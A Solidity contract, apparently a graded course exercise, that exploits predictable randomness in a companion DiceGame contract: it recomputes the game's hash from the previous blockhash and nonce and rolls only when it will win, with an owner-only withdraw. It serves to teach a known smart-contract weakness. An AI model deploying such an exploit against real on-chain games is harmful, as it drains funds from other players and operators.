pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    uint256 public minRol = 0.002 ether;

    constructor (address payable diceGameAddress) payable {
        diceGame = DiceGame(diceGameAddress);
    }

   
    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address payable _to, uint256 _amount) public onlyOwner {
        _to.transfer(_amount);
    }

    // Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Failed to send enought eth");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log('\t',"   Dice Game Roll in rigged contract is:", roll);
        require(roll <= 2 , "RiggedRoll: You can't roll the dice"); // if roll is not 0, 1 or 2, the roll is not a winner
        
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {  }
}
